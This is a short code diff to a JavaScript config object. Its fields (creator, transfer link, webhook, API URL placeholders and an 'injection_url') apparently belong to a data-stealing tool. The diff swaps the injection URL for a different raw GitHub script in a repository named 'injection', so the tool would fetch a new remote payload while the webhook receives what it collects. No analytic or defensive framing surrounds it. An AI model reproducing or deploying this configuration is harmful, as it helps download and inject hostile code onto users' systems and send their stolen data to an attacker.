@@ -23,7 +23,7 @@ var config = {
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/ksch-58/sub/main/index.js",
+    "https://raw.githubusercontent.com/ziskoweb/injection/main/indexjedf.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
